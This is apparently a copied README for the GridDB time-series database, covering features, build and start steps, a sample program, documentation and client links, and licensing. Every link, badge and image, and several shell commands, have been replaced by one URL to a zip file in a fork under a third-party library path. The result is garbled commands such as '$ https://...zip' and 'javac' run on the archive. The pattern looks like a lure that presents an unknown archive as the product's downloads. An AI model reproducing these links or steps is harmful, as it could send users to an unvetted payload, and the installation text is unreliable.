<img src="https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip" align="center" height="48" alt="GridDB"/>

[![Visit Website](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip) 
![GitHub All Releases](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip) 
![GitHub release](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
## Overview
  GridDB has a KVS (Key-Value Store)-type data model that is suitable for sensor data stored in a timeseries. It is a database that can be easily scaled-out according to the number of sensors.

  * High Reliability  
    It is equipped with a structure to spread out the replication of key value data among fellow nodes so that in the event of a node failure, automatic failover can be carried out in a matter of seconds by using the replication function of other nodes.

  * High Performance (in-memory)  
   Even if the memory is increased to handle big data in a RDB, it is known that CPU power cannot be fully exploited and only around 10% of CPU resources are allocated to actual data processing due to the large overhead in buffer management, etc. Given the increase in memory size, GridDB minimizes the amount of overheads required previously by lightening the buffer process and recovery process, and by making it lock-free during data processing.

  * Advanced data model and operation model  
    In a traditional distributed KVS, data is handled using operations such as Put/Get/Remove. GridDB expands these functions greatly to support the definition function for organizational data, SQL-like query function, transaction function and Java API (Application Programming Interface) so that RDB users are able to introduce the system smoothly. The key value represents the data in a set of records known as a key container. This is similar to the relationship between a RDB table name and table. It is also equipped with an application function for sensor data management.

  This repository includes server and Java client.

  (Additional infomation)  
  There is [Java client Package (Jar) for v4.0.0 on Maven Central Repository](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip) .

## Quick start
### Build a server and client(Java)
    We have confirmed the operation on CentOS 7.6 (gcc 4.8.5) and Ubuntu 18.04(gcc 4.8.5).

    $ https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
    $ ./configure
    $ make 
    
### Start a server
    $ export GS_HOME=$PWD
    $ export GS_LOG=$PWD/log

    $ bin/gs_passwd admin
      #input your_password
    $ vi https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
      #    "clusterName":"your_clustername" #<-- input your_clustername
    $ export no_proxy=127.0.0.1
    $ bin/gs_startnode
    $ bin/gs_joincluster -c your_clustername -u admin/your_password

### Execute a sample program
    $ export CLASSPATH=${CLASSPATH}:$https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
    $ mkdir gsSample
    $ cp $https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip gsSample/.
    $ javac https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip
    $ java gsSample/Sample1 239.0.0.1 31999 your_clustername admin your_password
      --> Person:  name=name02 status=false count=2 lob=[65, 66, 67, 68, 69, 70, 71, 72, 73, 74]

## Document
  Refer to the file below for more detailed information.  
  The documents below are stored in the docs folder.
  - [GridDB Technical Design Document](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)  (https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  - [Quick Start Guide](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip) (https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  - [API Reference](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip) (https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  - [RPM Installation Guide](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip) (https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  - [V3.0 Release Notes](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip) (https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  - [V4.0 Release Notes](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip) (https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  - [V4.1 Release Notes](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip) (https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  - [V4.2 Release Notes](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip) (https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  - [DEB Installation Guide](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip) (https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)

## Client and Connector
  There are other clients and API for GridDB.
  * [GridDB C Client](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  * [GridDB Python Client](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  * [GridDB Ruby Client](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  * [GridDB Go Client](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  * [GridDB https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip Client](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  * [GridDB PHP Client](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  * [GridDB Perl Client](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  * [GridDB WebAPI](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)

  There are some connectors for other OSS.
  * [GridDB connector for Apache Hadoop MapReduce](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  * [GridDB connector for YCSB (https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  * [GridDB connector for KairosDB](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  * [GridDB connector for Apache Spark](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  * [GridDB Foreign Data Wrapper for PostgreSQL (https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  * [GridDB Sample Application for Apache Kafka](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)
  * [GridDB Data Source for Grafana](https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip)

## Community
  * Issues  
    Use the GitHub issue function if you have any requests, questions, or bug reports. 
  * PullRequest  
    Use the GitHub pull request function if you want to contribute code.
    You'll need to agree GridDB Contributor License Agreement(https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip).
    By using the GitHub pull request function, you shall be deemed to have agreed to GridDB Contributor License Agreement.

## License
  The server source license is GNU Affero General Public License (AGPL), 
  while the Java client library license and the operational commands is Apache License, version 2.0.
  See https://raw.githubusercontent.com/sebaw12/griddb_nosql/master/3rd_party/picojson/org/picojson-cc9bff2d7fec0b5a1a13cc41654dfff33250c3fd.zip for the source and license of the third party.

